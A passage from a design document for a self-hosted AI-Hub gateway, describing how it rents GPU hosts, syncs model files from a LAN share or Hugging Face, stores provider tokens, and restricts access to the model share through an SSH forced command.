refreshes in a row; `view()["long_running"]` (> 24 h) drives the card and Dashboard
banner.
**Model sync** (`sync_once`, for the host's ONE ComfyUI service — `_plan_bid`; no
ComfyUI service = no plan, `_compute_plan` refuses): the destination index is rebuilt
by `find` over both roots on EVERY plan (the manifest `~/.gw-modelsync.json` records
where a file CAME from, never that it exists), `modelsync.plan` decides, and
`plan`/`ready_aliases` are REBOUND whole there and nowhere else (routing reads them from
a worker thread via `is_alias_ready(bid, alias)`/`alias_status(bid, alias)`). What only
the controller knows joins an alias's `blocked`: a LAN source that is not usable
(`waiting for LAN source (…)`), a transfer that gave up (fault
`sync`/`transfer`), a disk that cannot grow within the spec maximum (it grows by
`modify` otherwise). Ruling 18: an alias still waiting on a LAN file or a failed
transfer fetches none of its URL files either — nothing that cannot make it ready this
session goes onto the paid disk. URL files: HEAD for the size, ≤ 3 `curl`s ON the
instance (`setsid`, a lockfile holding the pid, `--config -` so the options — the HF
token included, and only for a `huggingface.co`/`hf.co` host, checked before the
command is built — travel on STDIN, never argv; `GW:STARTED` only once the lockfile
names the running curl, else `GW:START-FAIL` = a failed attempt — a stop's kill in
that window missed the curl), and a live lockfile is ADOPTED after a gateway restart,
never answered with a second curl on the same `.part`. A 2xx HEAD naming length 0 is
an unknown size; Sync now re-asks unknown and failed HEADs. A URL download's size or
sha256 MISMATCH is final at once (`_finish`: the same URL serves the same bytes — the
three attempts were three full downloads on a billed instance), and so is a 4xx
(`curl_http_status` reads curl's exit-22 line; `http_status_final`: 408/429 excepted);
5xx, 429 and transport failures keep the three attempts, and a LAN transfer's mismatch
stays non-final (`forget_sha` → re-hash: the share's file may have changed in place).
**URL fallback** (model sources): a URL that ended final — mismatch, 4xx, three
failures — for a file the share ALSO lists (its last good listing, `_share_lists`)
is given up for the share's copy: `_fall_back` FIRST runs `_abandon_cmd` (the curl the
lockfile names gets TERM/KILL — an attempt that gave up on unanswered polls leaves it
running — and the SHARED `.part`, holding URL bytes the LAN stream would resume onto,
is removed; `GW:ABANDONED` or no switch: the file then gives up as before), then
records `_url_fallback[path] = url`, logs once and books fault `sync`/`url_fallback`
with a reason that names a size difference as such ("size differs: the URL's file is
…, the share's copy … — syncing the share's copy", review M-3). `_compute_plan` hands
`plan` the URL sources WITHOUT those (`_without_fallbacks`, explicit and derived
alike) → the plan says `lan`; keyed on the URL — an entry naming another URL, or a
Check & save / remove of the path (`Controller.forget_fallback`, called by main on
EVERY controller, an `off` one included, final review I-1), drops the record and it is
tried by itself; Sync now clears it with `_failed`, EXCEPT for a path whose
transfer still runs (the URL's curl would resume onto the LAN's `.part`, fail the same
way, and the abandon would discard the LAN progress). The record is PERSISTED
(`State.url_fallback`/`url_fallback_why`) for the same reason: a gateway restart during
the fallback's LAN transfer must not plan the URL again — with its CAUSE
(`url_fallback_cause`: `verdict` = mismatch, 4xx, an invalid entry; `transport` = the
three attempts ran out on 5xx/429/dead connections; a record without one is a verdict):
`_created` drops the `transport` records for a NEW instance (they were about the last
session's network — kept, the next session would plan `lan` for good), the verdicts
stay. A gateway restart against the SAME instance (`resume`) keeps them all. A URL-only file
gives up and blocks as before; Ruling 18 holds (a fallen-back file waits for an
unusable LAN source like any LAN file). `view()["url_fallback"]` = `{path: reason}`,
no URL (a catalog URL may carry a query token). Every plan also drops entries of the
host bootstrap's template report (`bootstrap_unknown`, the card's "Models the template
brought along") that the fresh destination index lacks (`_prune_template_report`,
persisted). LAN files:
`LanSource` (ONE per gateway, `main.modelsrc()`: `modelsrc.key`, the host key pinned in
`modelsrc-known_hosts` with `StrictHostKeyChecking=yes` — pinned only by a POST
carrying the fingerprint `scan()` showed; `modelsrc_host` held to `_VOICE_HOST_RE`
before any argv and WITHOUT a default — blank is `hostctl.SRC_UNSET` ("LAN model
source not configured — enter the share host under Server → Models") and never reaches ssh (a
baked-in LAN address sent operators to create a user on a hypervisor; a leftover pin
next to a blank or non-plain host is pinned for NOBODY — `_pinned` needs a plain host —
so the card shows the install text, not "pinned · List now"); a pin for a
PREVIOUS host names itself instead of failing as "unreachable"; listing cached 10 min,
re-read at every start, on Sync now and on the card's *List now* —
`main.modelsrc_list` = `refresh(force=True)`, which needs the share only, no running
instance: without it a fresh pin read "not listed yet" until a RUNNING host's next
sync, i.e. "still broken") streams
exactly ONE file per host through the gateway (`pipe`: the share's `cat <rel>
<offset>` into `flock -n … cat >> <rel>.part` — a second appender exits 75), resumed
from the `.part`'s size, sha256 on both sides; the HF cache's snapshot symlinks are
recreated. The share's sha256 cache is PERSISTENT (model sources I-4/R-2): store
setting `modelsrc_sha` = `{"host": <modelsrc_host>, "files": {path: [size, sha256]}}`,
read and written through `LanSource(load_sha=, save_sha=)` (main's
`_modelsrc_sha_load/_save`; LanSource imports neither main nor store) — read only when
its `host` is the configured one, dropped whole on a host change (with the listing),
written after EVERY hash (every LAN transfer hashes, so each LAN-synced file has its
sha for free), dropped by `forget_sha` in both copies, and pruned of paths a fresh
listing no longer has at that size. Hashes run ONE at a time (`_hash_turn`; a second
request for one file takes the first's answer) by priority — `sha256(…, background=)`
0/False a transfer's, 1/True a Check & save's, 2 a directory check's background
confirmation, 3 the LoRA trigger-word worker (`main.lora_meta_pass`, lowest of all)
(M-5 / review-3 M-3: a LAN transfer holds the one stream slot until its
hash answers, and the next Check & save must not wait behind hours of confirmations;
a hash already running is not interrupted), `hash_queue()` lists the waiting paths in the order they will run (the
running one first), `sha_files()`/`known_sha()` read without hashing,
`sha_generation` changes with the cache; `sha256` raises RuntimeError only (an unset
host included). `_sha` is replaced, never mutated in place — `sha_files()` runs in a
worker thread — and every store write is numbered when its record is built, written
off the loop (`forget_sha`/`_follow_host` via the executor) and never overwrites a
newer one. `modelsrc_sha` is in `store._BULK_SETTINGS`: read through `get_setting`
only, never part of `get_settings()` (the Server tab and startup overlay would parse a
record that grows with the share). `main._share_sha_files()` is the ONE reader the
plan (`_host_deps`' `url_catalog` → `modelsync.url_catalog(…, share_sha)`) and the
overview use. Triggers: the start path, a 5-s alias-signature poll in `run_forever`, a
changed LAN source, a re-plan when a transfer ends and every 60 s while one runs. A
sync re-checks the phase after planning: a plan about an instance on its way out
never grows its disk or replaces the manifest the snapshot records.
**main's half**: `host_controllers` (host name → Controller); `sync_host_controllers()`
runs inside `rebuild_backends` BEFORE host grouping and the route index (it writes the
derived URL onto the dicts the adapters are built from): a controller per
`managed_hosts` entry (an existing one keeps its INSTANCE and gets the new entry and
service list; one whose entry is gone is retired only when `off`, idle and without a
pending snapshot — kept with a warning otherwise; an unknown provider or a
constructor that raises is booked in `_host_errors` — token redacted — and shown
"not driven", never aborting the rebuild; a provider change is never applied).
Attached = STORE backends with `host == name`; a `config.yaml` backend naming a
managed host is NOT attached (R-K3: its store copy would override the config
wholesale) — warned once and listed `not_attachable` on the card. `_attach_fields`
sets `remote_port` (profile default when unset), `local_port` and `url =
http://127.0.0.1:<local_port>` on the live dict and the store row (only on change).
`assign_local_port(name, type, prev=None)`: the row's port while valid and not held,
else the lowest free one of 18100–18999; held = every other backend's port plus the
ports other controllers still forward for backends that no longer exist; a port a
controller forwards for THIS backend wins over a row that merely claims it (the
claimant moves), and `prev` (a console rename's old identity) keeps the port across the
rename — a port that moves takes the URL from under running jobs. Lookups all go
backend → `host` → controller → service (R-W7, `_host_ctl`, only if `has_service`):
`modelsync_gate`, `_gated_only_aliases`, `_chain_successor_on`, `host_view`.
`host_action(name, start|stop|restart_service <bid>|resetup <bid>|forget_unreconciled|
sync|delete_unknown <paths>)` always answers text ("not driven: …" for a host without a
controller). `managed_host_refusal(name, entry, new)`: name `[a-z0-9-]` 1–40, not
starting/ending with `-`; a NEW name collides with nothing (R-W6) — no managed host or
retained controller, no key of the `hosts` map, no backend's `backend_host()` (a URL
hostname without a dot counts: `http://gpu-a:8188` is host `gpu-a`) — or two boxes would
share one host policy; the provider known and never changed; `options_of` clean.
`managed_host_refusal` also asks the provider's `options_refusal` against
`provider_specs(kind)` — the first CACHED `/v2/specs` of any controller of that kind
(the specs are the provider's; never a fetch, also bound into admin for the form's
placeholder) — so a vCPU count the configuration does not offer is a 400 at Save when
the specs are known.
`save_managed_host` stores the NORMALIZED options and `{provider, options}` only.
**The API token is the PROVIDER's** (operator test 2026-09-30: a provider shows its
token once, and a per-host field made the operator paste it into every host): one
STRING setting per kind, `provider_token_<kind>`, which `store._is_secret` treats as a
secret (encrypted by `set_settings`, R-W10) and `store.get_settings()` OMITS (the Server
tab and the startup overlay never see it) — read/written only by
`store.get_provider_token`/`set_provider_token` ("" deletes the row) and
`main.provider_token`/`save_provider_token(kind, token)` (unknown provider or a token
with whitespace/control characters refused; CLEARING refused while any controller of
that kind is not idle-off — it reaches every such host at once, and a running one's
stop would 401 into `failed` with the instance billing — rotation stays allowed; then
`apply_managed_hosts()` so running controllers get it at once). `sync_host_controllers` hands each controller
`dict(entry, api_key=<its provider's token>)` — hostctl still reads `host["api_key"]`
— and redacts that token from a constructor's error. `store.set_managed_host` DROPS an
`api_key`; `get_managed_hosts` still decrypts a legacy one for
`main.migrate_provider_tokens()` (lifespan, idempotent): a provider without a token takes
a READABLE per-host token — a host whose `host_state` record names an instance first
(it must stay stoppable), else by host name — never overwriting one, then every entry
loses its copy; a dropped token that DIFFERS from the provider's is a WARNING naming
the host (a second account's host would otherwise first say so as a 401 at its stop);
never the value. `host_view` computes `checklist` only while the host is startable. Views, summaries and `/health`
carry `api_key_set` (the provider's token set?) and `provider_tokens_info()` `{kind:
bool}` only. `suggest_host_name(kind)` → the first `<kind>-<n>` that
`_host_name_refusal` (the name rule + R-W6, shared with `managed_host_refusal`)
accepts — the new-host form's pre-filled name. `host_view` of a driven host carries
`start_blockers` and `checklist`. `delete_managed_host` (and
`managed_host_delete_refusal`, which the card asks) refuses unless the host is `off`,
no op, no pending snapshot, **no backend names it** (it would point at a dead forward
and keep the name taken via R-W6), and — without a controller — the stored record is
readable and says `off` without uuid/index/pending snapshot (an undriven host may still
name a billing instance); deleting also drops its `host_state` record and its Hosts-map
entry. There is no rename (R-W5: the name IS the identity of state, snapshots and
socket). `/health` (full view only) carries `hosts_managed: {name: {provider, phase,
uptime_s, cost_per_h, services: {bid: status}[, error]}}`. `test_hostctl.py`,
`test_managed_hosts.py`.

### `modelsync.py`

The PURE half of the model sync: which files an alias candidate
needs and where they are in the source. `effective_workflow` applies THAT
candidate's `fixed` pins and drops its `bypass` nodes (the adapter's two per-backend
rules — the raw workflow syncs the weights a pin replaced, tens of GB billed per
hour). `refs_for`: loader detection as `scheduler.model_set_key` but with a WIDER
"how" exclusion (`format|quant|mode|type|scheme` — `Trellis2LoadModel_GGUF.model_format
= "GGUF Q4_K_M"` otherwise blocked every alias on that node for good), plus every
string input of ANY class ending in `MODEL_EXT`; empty LoRA slots, asset extensions and
core `Load3D` are never refs; a mapped client-selectable loader field syncs only its
default (`selectable`). A ref's `kind` (Ruling 2): `file` resolves against the source
index; `hub` (`org/repo`) and `name` (a bare word a node resolves itself) are catalog
material only — **strict hub coverage** (Rulings 15/17): only a catalog entry with a
class AND a value covers a hub ref, never an alias entry, and an uncovered hub ref
BLOCKS (the reason names the entry it needs), while an unmatched `name` is nothing.
An alias with an EMPTY reference set and no alias entry is `blocked: no model
references known` — `paths: []` says "needs nothing" explicitly. `resolve` never
guesses: the loader class's folders in ComfyUI's order, then a UNIQUE `/<value>`
suffix; two hits `Ambiguous`, none `Missing` (copying the wrong one of two same-named
files is a plausible wrong result). Two roots, every path prefixed: `models/…` ↔
`~/ComfyUI/models/…`, `hf-cache/…` ↔ `~/hf-cache/…` (`HF_HOME`); `hf-cache/token` and
every dot segment are never resolved, expanded or accepted (a path onto the token ships
a credential to a rented machine). The catalog (setting `modelsync_catalog`):
`validate_catalog` refuses out loud (a typo'd key would leave its alias blocked with no
hint), `catalog_paths`/`url_catalog` drop whatever it would refuse, so an unvalidated
catalog never expands a whole root (`hf-cache/hub/` itself is refused);
`DEFAULT_CATALOG` holds public hub/base models ONLY — never a private model or LoRA
name in the repo — and `main._modelsync_catalog` copies it into the setting ONCE
(`store.setdefault_setting`), after which an emptied catalog stays empty.
**Public download sources** (model sources, spec 2026-10-01; a share file synced over
the operator's uplink at ~15 MB/s is often public on Hugging Face, where the instance
pulls hundreds of MB/s). Three catalog entry shapes, exactly one per entry, unknown keys
refused: `{match, paths}`; the per-file source `{file, url, sha256?, size?, verified?}`
(`size` = the share file's at Check & save, int ≥ 1 — old entries without it stay
valid and are never outdated; `verified` = what Check & save proved, `VERIFIED`:
`sha256` or `size` — the overview's "size only"); the directory source `{dir, repo, rev, files}` (`dir` a `models/…/`
directory, `repo` an `org/name` HF id — no `--`/`..`, `rev` the 40-hex COMMIT, never a
branch, `files` = `{relpath: [size, sha256|null, provisional]}`, what the check
verified; `provisional` = the sha is HF's `X-Linked-Etag`, the share's not known yet).
`derived_urls(source_index)` is Stage 1, pure and stored nowhere: a snapshot link
`hf-cache/hub/models--<org>--<name>/snapshots/<40-hex rev>/<path>` that `link_target`
resolves to `blobs/<oid>` of the SAME repo (a nested path has more `../` — never
pattern-match the target text) makes that BLOB a download from
`huggingface.co/<org>/<name>/resolve/<rev>/<quote(path)>`; a 64-hex oid is the content
sha256, a 40-hex one the git sha1 (size only), anything else, a non-commit rev,
`datasets--`/`spaces--`, an unlisted blob or a link leaving its repo derives nothing; a
regular file under `snapshots/<rev>/` (`HF_HUB_DISABLE_SYMLINKS`) is its own download,
size only (by rule a blob linked only from a dot file — `.gitattributes` — and an
org-less legacy repo stay LAN). `source_kinds(catalog, source_index, share_sha=None)` is the ONE place the
rules live (plan input, overview, card badge): per path `kind` `url` (origin
`file`/`dir`) | `hf-auto` | `outdated`, absent = `lan`; precedence per-file entry >
dir entry > derivation (an operator's mirror wins), a later entry wins within a shape,
and an entry whose stored `size` ≠ the share LISTING's is OUTDATED and yields to the
next source — a listing comparison, never a share hash on the plan path (with
`share_sha`, the persistent `{path: [size, sha256]}` cache, a sha that differs at the
listed size is outdated too). "Outdated" after the fact never re-fetches a file that is
PRESENT: `present()` compares sizes, so an instance already holding the URL's bytes at
the same size keeps them (and the alias stays ready) — the overview's "outdated —
re-check" is about the ENTRY, not about what a running host holds. A row that replaced
an outdated entry keeps its reason as
`outdated_entry` (the dead entry stays in the catalog until re-checked), every row
carries `listing_size`, and `dir_for(path, catalog)` names the dir entry a share file
the check never saw falls under (→ `lan`, "re-check the directory"). `url_catalog(catalog, source_index)` is its plan view
(`{path: {url, sha256?, origin?}}`, outdated dropped; one argument = the old helper:
explicit entries, nothing derived or outdated); hostctl's `Deps.url_catalog(src)` is
handed the SAME listing the plan is built from. `plan`'s url fetch entries carry
`origin` `hf-auto`|`catalog` — a display label, no plan state. `plan`:
present = the destination holds the file at the SOURCE's size (the manifest's where the
source does not list it), a `.part` never; `prune` = manifest files only (never a file
we did not put there), applied only at stop; `unknown` = everything else nobody needs,
listed, deleted only by the operator (`delete_unknown`, judged against a FRESH plan;
the deleted paths also leave the persisted template report `bootstrap_unknown`, or the
card's "Models the template brought along" kept naming files that are gone) —
minus what ComfyUI ships itself (`_comfy_stock`: `put_*_here` placeholders, empty
files, stock `models/configs/*.yaml` under 1 MB), which buried a template's one real
model among 36 of them;
a BLOCKED alias fetches nothing but HOLDS its manifest files (`held`, never pruned —
Ruling 16); fetch order = aliases by fewest missing bytes, big files first. Symlinks
(`resolve_link`): a link is kept only when its target stays in its root and is a file
the same alias syncs — one that would dangle is dropped, never "present".
`status_text` is the 503 wording. `test_modelsync.py`.

### `loratags.py`

The PURE half of **LoRA trigger words** (spec
`2026-10-02-lora-trigger-words-design.md`, local only). **AI-Hub stores and delivers
trigger words; it never changes a prompt.** Metadata hangs on the sha256 of the file on
the LAN share (the share renames files): `share_loras` (listing → `{listed path: (real
path, size)}`, a link counts as its target), `share_path` (name → `models/loras/<name>`,
else the UNIQUE suffix match, never a guess), `clean_words` (form only — a tag chain
stays ONE entry), `parse_civitai` (by-hash answer → record; no version → ValueError =
transient), `civitai_url` (from integer ids only), `status_of` (the ONE status rule:
unavailable / pending / not_on_share / curated / civitai / not_on_civitai — a share not
listed yet is pending, never a verdict), `effective_words` (curated, also [], wins),
`lookup`/`items` (the client item; `pair` + merged words only when the alias's workflow
has BOTH high and low stacks). main's half: store table `lora_meta` (sha → `{civitai,
curated, curated_at}`), `lora_meta_loop` (lifespan; idle without `modelsrc_host`) whose
`lora_meta_pass` asks Civitai for every hash that needs it (≤ 1/2 s; 404 persisted; 429
global pause; 5xx/odd answer per-sha backoff in memory only) and then hashes ONE share
LoRA at LanSource priority **3** (behind transfer 0, Check & save 1, dir confirmation
2), pausing max(10 s, its duration); the API (`/v1/generations/{alias}/loras` `items`,
`/loras/{name:path}`) and the LoRAs tab read `_lm_snapshot()` only. Refresh all
re-asks Civitai (no re-hash), refresh one forgets the sha; neither touches `curated`.
`test_loratags.py`, `test_lora_meta.py`.

### Model sources

(spec `2026-10-01-model-sources-design.md`, local only): a share
file is synced from a PUBLIC URL when the catalog names one — Stage 1 derives the
share's Hugging Face cache (`modelsync.derived_urls`, above); Stage 3 is **Check &
save** in `main`, the operator naming a URL for a share file, or a Hugging Face repo
for a share DIRECTORY, verified against the share BEFORE the entry is written. Never
on the request path: `check_source(path, url)` / `check_dir_source(dir, repo,
rev="main")` validate the input (an immediate "not checked: …"), then queue a task —
ONE check at a time (`_src_lock`, per event loop), a second request for a key that is
still pending answered "already queued". `source_checks()` = `{key: status}` (key =
the path, or the dir ending in `/`; `state` queued|heading|hashing|done|refused, a
FIXED `reason`, `note`, `left_out`/`outdated` `{relpath: reason}`, `confirming`,
`progress`), `source_checks_pending()` (a check or a dir's background hash still
pending — the overview's live flag), `await remove_source(key)` drops the per-file
or dir entry (and cancels a pending check of it and a dir's confirmation) — a
coroutine on purpose: the cancels run ON the loop (`Task.cancel()` from a worker
thread is not thread-safe and may be lost), only its catalog write goes to a thread;
never wrap it in `asyncio.to_thread` (review-3 RR-1). **The HEAD** (`_head_ref_url(url,
hf_token_ok=True)` → `UrlHead{error, size, sha256, commit, status, hops}`, never
raises) is `_fetch_ref_url`'s SSRF rule on EVERY hop (review C-2): each name resolved,
every address `ref_addr_blocked` (WITHOUT `ref_url_allow_cidrs` — a LAN mirror is
unreachable from a rented VM, so passing the check would only promise a download that
cannot happen), the connection to exactly the checked IP with the original Host and
`sni_hostname`, no automatic redirects — each `Location` (relative ones joined) is a
new hop through the same rule, at most `_HEAD_MAX_HOPS` 5, https only —
`Accept-Encoding: identity` (else a small file's Content-Length is the compressed
size), and the HF token on the FIRST hop only and only to `hostctl._HF_HOSTS` (a
same-host redirect goes without it too: the rule has no exception to get wrong — a
401/403 there says "after a redirect within Hugging Face — enter the URL the redirect
names"; the token is read ONCE per check, off the loop, and passed as `token=`).
`X-Linked-Size`, `X-Linked-Etag` (quotes/`W/` stripped, only `^[0-9a-f]{64}$`) and
`X-Repo-Commit` come from the FIRST response, and only when that is an HF host
(another server's would end the HEAD early or earn "verified by sha256" on its word —
its file is size-only) — HF's 302 carries them, the CDN's ETag is
no sha256 and `X-Xet-Hash` another hash, both ignored (M-6); the next hop is made only
while the size is unknown, which then comes from the last `Content-Length` (0 =
unknown). Refusals are fixed texts ("HTTP 404", "redirect to a private address", …);
a response body is never read. **File check**: the share must list the path as a file
(a `lan.refresh()`, cached 10 min, first); HEAD; size ≠ the listing's → refused with
both sizes (`modelsync.size_text`); the share's sha256 from the persistent cache, else
`lan.sha256(…, background=True)` (state `hashing`); an LFS sha256 the URL named must
equal it ("hash differs" otherwise), none named = accepted as `verified: "size"`. The
entry written is `{file, url, size, sha256: <the SHARE's>, verified}` — the instance
verifies the download against the share's bytes and falls back to the share's copy on
a mismatch — in place of every per-file entry of that path. **Directory check**
(R-1/R-6, `modelsync.dir_source_error` for the input): every share file under `dir`
(no `.part`, no links) gets ONE HEAD; the first answer's `X-Repo-Commit` fixes the
commit and every later HEAD goes to `resolve/<commit>/…` (a file failing before a
commit is known is left out, an answer WITHOUT one refuses the check: no HF repo);
`modelsync.dir_check_row` accepts a file on its SIZE — the row's sha is the cached
share sha (an LFS sha that differs → that file left out), else HF's LFS sha
`provisional`, else null; a file whose HEAD fails or whose size differs is left OUT
(→ `lan`, `left_out` names why); refused only when NO file verified. The entry
`{dir, repo, rev: <commit>, files}` replaces the entry of the same `dir`; per-file
entries under it stay (they win). Rows without the share's sha are confirmed in the
BACKGROUND (`_confirm_dir_rows`, priority 2, ONE task per dir in
`_src_confirm_tasks`, the run's token in `_src_confirm_run`; a re-check or
`remove_source` cancels it — its queued hashes leave the LanSource queue — and a hash
already running writes nothing, `_confirm_row` judging the token under the catalog
lock; `_src_confirming` = `{path: run token}`, a run pops only its own markers, so the
pending flag holds while a newer run hashes):
null → the share's sha, a provisional one that matches → `provisional: false`, one
that differs is LEFT provisional — the persistent share-sha cache now holds the
share's hash, and `modelsync.source_kinds` turns that file `outdated` ("the share's
copy differs from the Hugging Face copy"); a row changed meanwhile is never touched.
**One lock for every writer of `modelsync_catalog`** (`_catalog_lock`, a
threading.Lock held only around the store read-modify-write, never across an await):
Check & save, the background confirmations, `remove_source` and the console's
`save_modelsync_catalog(cat, expect_hash=None)`, which refuses with
`[CATALOG_STALE]` when `modelsync_catalog_hash()` moved since the form was rendered
(the editor's stale-form rule, R-3). A Check & save write re-checks under that lock
that its check still exists (a remove meanwhile → nothing written: the worker thread
is beyond a cancel). Only the NEW entry is validated on a Check &
save (an unrelated broken entry never blocks it — modelsync drops such entries one by
one anyway). `test_model_sources.py`.
**The overview** (Server → Models → "Model sources"): `model_sources_view()` is the
spec's "needed file" list — `service_alias_needs` of EVERY ComfyUI backend
(`_comfy_backend_names`, the merged `backends`) through `modelsync.plan(needs,
lan.cached(), {}, {}, url_catalog)` and its `per_alias[*].files` (NOT `fetch`, which
drops the blocked aliases — the ones most worth seeing), a link credited to the file it
points at; per row `kind` from `source_kinds` (absent = `lan`), `entry_key` (what
`remove_source` takes: the path, or the dir entry whose `files` names it —
`_dir_entries_by_path`, validated once per rebuild), `dir_entry`/`dir_repo` (a LAN file under a dir source whose check
predates it) and `aliases` `[[alias, blocked reason]]`. BLOCKING and memoised on (the
ComfyUI backend names, `_overview_alias_key` — ONE alias read and ONE dump over every
candidate on them, so a memo hit stays cheap — the catalog hash, `lan.generation`,
`lan.sha_generation`) in `_msrc_memo`; the catalog is read through
`_modelsync_catalog_view` (NO seeding: a view never writes the store — the console's
editor is bound to it too; `modelsync_catalog_hash()` reads it the same way, the
default hashing like the seeded default) and handed to `service_alias_needs(bid,
catalog)`; `model_sources_overview()` (bound into admin)
builds it in `asyncio.to_thread` and lays the live parts over a COPY on the loop:
every controller's `url_fallback_view()` (in memory, not the whole `view()`; per HOST —
`"<host>: <reason>; …"`, a URL that failed on one instance may work on another),
`source_checks()`, `lan.hash_queue()`,
`pending` (= `source_checks_pending()` or a hash queued — the section's live flag),
`lan.problem()`. `model_source_kinds()` (BLOCKING, own memo on catalog hash + the two
generations) is the host card's `{path: {kind, reason, origin}}`. Never starts a hash
or a listing. `test_model_sources.Overview`.

### `ops/`

(not Python — runs on other boxes). Both bootstraps are streamed to the
instance and keep everything inside `main()` called on the LAST line (bash reads a
piped script as it runs and a child reading stdin would swallow the rest; `main` also
gets `</dev/null`), speak the `GW:` protocol, and never even contain the any-address
(a test pins it). The split is R-W3: `host-bootstrap.sh` runs on the first start of
EVERY host whatever is attached — the template's own autostart off (Thunder's
`comfy-ui` template starts a ComfyUI on every interface, on a vLLM-only host just as
much: the moved pkill + `disable_rc_autostart`), the models and node packs the
template brought reported (`GW:UNKNOWN_MODEL`, `GW:TEMPLATE_NODE`, the latter filtered
by `~/.gw-nodes.txt` when present), `flock` (via `sudo -n apt-get` only when missing)
and `uv` (`~/.local/bin/uv`) installed; no service is installed there.
`thunder-bootstrap.sh` is the ComfyUI part only, run when a ComfyUI service is
attached: a `stop` phase first (`stop_comfy_processes`: our loop and every `main.py`
whose cwd is the checkout — a re-run never checks out under a running ComfyUI), then
adaptive — reuses the template's ComfyUI pinned to the commit, keeps a venv only if it
matches the k12-gpu build (Python 3.13, torch 2.11.0+cu130; `make_venv` refuses without
the host bootstrap's uv), node packs, ComfyUI-Manager, the smoke test — and writes
`~/start-comfy.sh <port>` (digits only, default 8188; lock opened `9>>` so a second
start never truncates it, recording `"<pid> <port>"` for the group stop; ComfyUI on
`127.0.0.1` with `HF_HOME=~/hf-cache`). `parse_node_line` exists in both scripts
byte-identically (a streamed script cannot source a shared file; a test pins them
equal). `thunder-nodes.default.txt` (`<git-url>@<commit>` /
`registry:<id>@<version>`, derived from the k12-gpu workflows), and `modelsrc-serve.sh`
— the SSH forced command on the model-share host and the WHOLE security boundary of
the gateway's LAN key: it parses `SSH_ORIGINAL_COMMAND` in the `shlex.quote` grammar
WITHOUT a shell, allows `list` (`F\t<rel>\t<size>` / `L\t<rel>\t<target>` for in-tree
links to listed files), `cat <rel> <offset>` and `sha256 <rel>`, refuses (exit 2)
absolute paths, `..`, dot segments, `*.log`, anything in the HF cache but
`hf-cache/hub/…`, and any path whose `realpath -e` is not itself; cat/sha256 then read
ONLY from fd 3, re-verified via `/proc/self/fd/3` (no swap after the check can redirect
the read); L lines never cross `models/`↔`hf-cache/`; exit 1 = "list incomplete"
(discard the listing) or a symlinked `hf-cache/`. Recommended install: a VM that
already MOUNTS the share, its existing user, the script in `~/bin/modelsrc-serve` and
ONE `restrict,command="MODELSRC_ROOT=<mount> /home/<user>/bin/modelsrc-serve"` line in
its `authorized_keys` (no new user, no root, nothing on a hypervisor); the dedicated
`modelsrc` user on the share host is the marked alternative. Its user needs a REAL
login shell (`/bin/bash`: sshd runs the forced command through it, `nologin` runs
nothing) and `hf-cache/` must be a real directory in the share. `test_modelsrc_serve.py`,
`test_thunder_scripts.py`.
Console side (`admin.py`, routes under `/ui/hosts/managed/*` — Ruling M1: the concept
in the URL, no provider name; the host travels as field/query `host`, a service as
`bid`): the Backends tab's **Managed hosts** section (`_managed_hosts_section`,
`data-sk="mhosts"`, below the backend list) with "+ Managed host" → the host form
(`_managed_host_form`, `?mhost_new=1` / `?mhost=<name>`: name + **Provider** select
from `hostapi.PROVIDERS`, then the provider's OWN `OPTION_FIELDS` as `opt__<key>` — a
hand-kept copy drifts, which is exactly how the old `_THUNDER_*` constants had to be
pinned by a test; a new Thunder host's nodes pre-filled from the default list; an
existing host has no name field and a fixed provider; NO token field). The section
is ALWAYS rendered (token → host is the setup order): the 4-step guide
(`_MHOST_GUIDE`, step 1 a link to `/ui/server?sub=keys` — the provider tokens and the
HF token live in Server → API Keys since 2026-10-01, see the admin.py paragraph),
the pointer line to Server → Models (`_MHOST_MODELS` — the LAN block and the catalog
live there since 2026-10-01, see the admin.py paragraph), "+ Managed host", the cards. The host form opens with "AI-Hub rents the machine itself …
Do not create an instance in the <NAME> console", pre-fills a new host's name from
`main.suggest_host_name` (hint: a label inside AI-Hub only) and puts the options under a
"What to rent at Start" heading; `managed_host_save` hands the typed options to
`main.save_managed_host` and answers a refusal with 400 + the form as typed. One keyed
card per host (`_host_card`, `data-k=
"host-<name>"`: provider + phase badges, the 24 h banner, errors, `tunnel_error`,
per-service drain lines, GPU from `options` and the RESOLVED vCPU count (`_vcpu_fact`:
`view()["vcpus"]`, else the option, "vCPUs included" for an unknown blank), costs,
snapshot, bootstrap notes
— the running bootstrap's line, bar and last log line (`_bootstrap_running_html`) and
the start step strip (`_start_steps_html`, ✓/●/○), pure markup —,
unreconciled uuids, orphans, template models/nodes, the **service table**
`_svc_table` — backend, type, `VM :<remote> → local :<local>`, status, error, and
Restart / Re-run setup carrying the BACKEND id, rendered only while the host runs
with no op, mirroring the controller's refusals — `not_attachable` lines, the model
sync, the log ring); while startable, the `checklist` (✓ / ✗ / – optional; a missing
item with a `key` links to where it is set up — `_CHECK_LINKS`: token → Server → API
Keys, lan → Server → Models) above the service table, two GET links `+ ComfyUI on this host` (no ComfyUI attached yet) /
`+ OpenAI-compatible service on this host` → `/ui/backends?new=1&type=…&host=<_q>`,
which `_host_prefill` turns into the new-backend prefill (host selected so the
`data-mhost` fieldset renders visible and `url` readonly server-side, the profile's
remote port, the first free `<host>-comfy`/`<host>-llm` over every backend name; an
unknown host or type = the plain form); Start rendered `disabled` with the first
`start_blockers` item as title plus a `-startwhy` line — cosmetic, the handler and
`start()` still refuse; foreign instances say "not managed by AI-Hub — billing $/h; if
you created it by hand, delete it in the <NAME> console" (no button); Start hidden for
an undriven host, Delete only when
`managed_host_delete_refusal` is None (else a hint naming why); then the orphaned
snapshots. On Server → Models: the LAN card (public key, install instructions — VM
variant first — the Fetch → Confirm pin, *List now* and the last listing's counts and
age) and the catalog editor (with a hint linking to the HF token in Server → API Keys;
`hf_token` in `store._SECRET_SETTINGS`; R-3: its form carries `catalog_hash` — the
hash of the very list it renders, `_catalog_hash_of` — and sits under
`data-live-skip`, so the morph never swaps that hash under a kept, edited textarea;
`hosts_catalog_save` passes it as `expect_hash` (a POST WITHOUT the field — a tab
opened before the deploy, a script — is judged stale), and a `_catalog_stale` refusal
is a 400 with the text AS TYPED, the CURRENT hash and the stored catalog read-only
beside it (`hosts-catalog-current`, outside the form) to merge from, plus a note while
`source_checks_pending()`; a validation refusal keeps the hash the form was opened
with), then **Model sources** (`_model_sources_block`,
`data-k="msrc"`, from `main.model_sources_overview` awaited by `server_page`/
`_models_view`): the summary (`_msrc_summary` — a failed URL counts as LAN only and
says so), the share-hash queue, the checks of this session (state, progress, fixed
reason, `left_out`/`outdated` per relpath), a GET filter form (`?src=lan|outdated|
failed|url|hf`, `_msrc_show`; no script), and one keyed row per needed file
(`msrc-f-<path>`) in `_msrc_items` order — LAN only by size, outdated, failed, public;
